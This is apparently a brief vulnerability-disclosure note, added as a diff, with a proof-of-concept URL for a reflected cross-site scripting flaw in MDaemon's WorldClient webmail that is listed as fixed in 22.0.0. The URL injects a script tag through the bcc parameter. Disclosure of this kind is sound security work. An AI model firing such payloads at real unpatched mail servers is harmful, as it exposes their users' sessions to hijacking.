@@ -1,0 +1,9 @@
+Product: MDaemon 
+Status: Fixed at version 22.0.0
+
+Poc
+https://localhost/WorldClient.dll?Session=<session_cookie>&View=Compose&ReturnConfig=1&t=&spellcheck&cc=GTN&bcc=%22%3E%3Cscript%3Ealert(%27XSS_TEST_BY_GTN%27)%3C/script%3E
+
+XSS executed
+
+
